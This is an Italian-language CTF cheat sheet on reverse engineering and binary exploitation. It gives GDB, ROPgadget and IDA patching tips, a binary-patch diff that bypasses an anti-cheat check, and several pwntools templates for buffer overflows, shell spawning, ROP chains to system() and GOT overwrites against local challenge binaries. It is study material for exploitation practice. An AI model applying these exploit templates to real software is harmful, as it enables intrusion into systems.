# Rev-PWN

### General terminal command

- **strings *nomeFile*** → Stampa tutte le stringhe del programma
- **checksec *nomeFile*** → per vedere struttura file
- **cat *nomeFile*** → per vedere contenuto file

**ROP**

- ROPgadget --binary ***nomeFile***| grep "rdi” → per creare un ROP gadget
    - E si cerca tra la stampa una cosa simile: 0x00000000004007c3 : pop rdi ; ret → ovvero con il ret alla fine
        
        In caso ce ne siano più di uno trovare quello che esegue i pop che ci interessano (in caso provarli tutti)
        
- ROPgadget --binary ***nomeFile***| grep "ret” → per aggiungere il ROP di return
    - Si cerca tra la stampa l’indirizzo con solo ret scritto, es.: 0x000000000040053e : ret

### GDB debbuger

- **gdb *nomeFile →*** per aprire debbugger del file
    - **break *nomeFunzione*/break **indirizzoMemFunzione →*** per impostare un breakpoint nella funzione
    - **jump *nomeFunzione →*** per chiamare quella funzione
    - **disas *nomeFunzione →*** per vedere cosa fa la funzione (a volte può essere necessario inserire prima un breakpoint)
    - **x/s *indirizzoMemVariabile →*** stampa valore della variabile
    - **print $eax →** stampa valore registro
    - **info registers** → permette di vedere i registri del file
- **checksec *nomeFile →*** per verificare se RELRO è FULL quindi file protetto da scritture sullo stack
    
    **Calcolare buffer**
    
    - **pattern_create *dimPattern nomePattern***
    - **run < *nomePattern** → per runnare il pattern*
    - **pattern search** → per vedere la dimensione del buffer
        - **EIP+0 found at offset: *dimBuffer →*** dimBuffer sarà la dimensione che dovremo utilizzare

### IDA Tip

- **Evitare la chiamata di una funzione** → cliccare su di essa, e cambiare il suo esadecimale con tutti 90 (edit → patch program → change byte. Per salvare: edit → patch program → apply to input files)
- **Leggere cella di memoria di una funzione** → Andare su finestra exports
- **Patch di un rand()** → evitare la chiamata di timer() e srand() che setta il seed del random, così facendo la risposta corretta è sempre 0

### PWN

```python
from pwn import *

garbage = b'java'+b'A'*28
address = p64(0x4007a2) #indirizzo che vogliamo che venga chiamato dopo aver fatto overflow
p = process('./java')
p.sendline(garbage+address)
p.interactive() #da usare se con questo codice si aprira una shell da cui poi dovremo operare
#p.recvall() da usare al posto di interactive se il programma termina e vogliamo ottenere l'output
#----------------------------------------------------------
#Per ottenere l'indirizzo della funzione che vogliamo chiamare
elf=ELF('./java')
address = p64(elf.symbols['print_flag'])
#----------------------------------------------------------
p.sendline(asm(shellcraft.sh())) #se è necessario generare una shell
#-----------------------------------------------------------
exit_got = elf.got['exit'] #da usare se la funzione è in GOT (quindi cambia indirizzo)
#--------DA USARE SE PIE ATTIVO-------------------
from pwn import *

p=process('./challenge')
main =p.unpack()
elf = ELF('./challenge')
elf.address=main-elf.symbols['main']
where = elf.symbols['read']
what = elf.symbols['oh_look_useful']

p.pack(where)
p.pack(what)
p.interactive()

#-----------Da usare per ROP------------------------------------
from pwn import *

p=process('./split')
garbage=b'A'*40
ROPgadget=p64(0x4007c3)#Ottenuto con: ROPgadget --binary split | grep "rdi"
addressFlag=p64(0x601060)#Ottenuta da Export IDA
systemAddress=p64(0x400560) #Ottenuto con da gdb: p system
ret=p64(0x40053e) #Ottenuto con: ROPgadget --binary split | grep "ret”

p.sendline(garbage+ret+ROPgadget+addressFlag+systemAddress)
print(p.recvall())
#-----------------what - where --------------------
from pwn import *  # type: ignore

context.binary = "./NeedsToBeHappy"
e: ELF = context.binary  # type: ignore     #just to make the typechecker happy
p = process()
p.sendline(b"y")
p.sendline(str(e.functions["give_the_man_a_cat"].address).encode("ascii"))
p.sendline(str(e.got["exit"]).encode("ascii"))
print(p.recvall())
#----------------what - where v2-----------------------
from pwn import *

e = ELF("./goat")
p = process("./goat")

p.sendline(hex(e.got["exit"]))
p.sendline(hex(e.symbols["win"]))
print(p.recvall())

```

### C functions

```c
__asm__() //è molto probabile che sia da arrivare a questa funzione e chiamare una shell
```

### ROP

Da usare se dopo aver messo break sul main e aver runnato con gdb ottengo una cosa simile

```bash
RAX: 0x400697 (<main>:  push   rbp)
RBX: 0x0
RCX: 0x400760 (<__libc_csu_init>:       push   r15)
RDX: 0x7fffffffdf98 --> 0x7fffffffe245 ("SHELL=/bin/bash")
RSI: 0x7fffffffdf88 --> 0x7fffffffe1f6 ("/mnt/c/users/aless/Downloads/Challenges/challenge rop/Challenges/1_split/split")
```

## Radare2

[https://radareorg.github.io/blog/posts/using-radare2/](https://radareorg.github.io/blog/posts/using-radare2/)

### Hexadecimal code

[https://faydoc.tripod.com/cpu/jle.htm](https://faydoc.tripod.com/cpu/jle.htm)

## CrossTheBridge

```diff
2c2
< CrossTheBridge:     formato del file elf64-x86-64
---
> CrossTheBridge_patched:     formato del file elf64-x86-64
711c711
<     1ae8:	75 74                	jne    1b5e <is_someone_cheating+0xa0>
---
>     1ae8:	eb 74                	jmp    1b5e <is_someone_cheating+0xa0>
766c766
<     1bba:	0f b6 44 05 f5       	movzbl -0xb(%rbp,%rax,1),%eax
---
>     1bba:	b8 4c 00 00 00       	mov    $0x4c,%eax

```
